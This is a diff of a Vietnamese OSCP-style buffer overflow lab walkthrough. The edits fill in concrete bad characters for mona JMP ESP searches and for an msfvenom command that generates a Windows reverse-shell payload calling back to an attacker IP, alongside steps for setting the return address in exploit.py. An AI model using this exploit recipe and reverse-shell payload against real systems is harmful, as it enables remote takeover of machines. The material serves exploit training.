@@ -9,8 +9,8 @@ TL;DR:
 !mona bytearray -b "\x00"
 !mona compare -f C:\mona\oscp\bytearray.bin -a
 
-!mona jmp -r esp -cpb <bad chars>
-msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b <barchars> -f c
+!mona jmp -r esp -cpb "\x00"
+msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f c
 ```
 
 ## Bước 1: Khởi tạo
@@ -183,14 +183,14 @@ Kết quả nhận được giá trị \x11 là bad character (nếu có các k�
 
 Sau đó xoá giá trị này khỏi payload trong `exploit.py` và tiến hành khai thác. Lặp lại các bước trên đến khi không còn bit nào sai.
 
-Thu được các bad character: "\x00\x11\x40\x5f\xb8\xee"
+Thu được các bad character: `"\x00\x11\x40\x5f\xb8\xee"`
 
 ## Bước 4: Reverse shell
 
 Lấy giá trị retn trên Immunity Debugger:
 
 ```
-!mona jmp -r esp -cpb <bad chars>
+!mona jmp -r esp -cpb "\x00\x11\x40\x5f\xb8\xee"
 ```
 
 Lấy một giá trị con trỏ bất kì, viết ngược lại và điền vào biến retn trong `exploit.py`. Ví dụ với địa chỉ 625011AF:
@@ -202,7 +202,7 @@ retn = "\xaf\x11\x50\x62"
 Khởi tạo payload reverse shell:
 
 ```
-msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b <barchars> -f c
+msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00\x11\x40\x5f\xb8\xee" -f c
 ```
 
 Điền kết quả của câu lệnh trên vào biến payload.
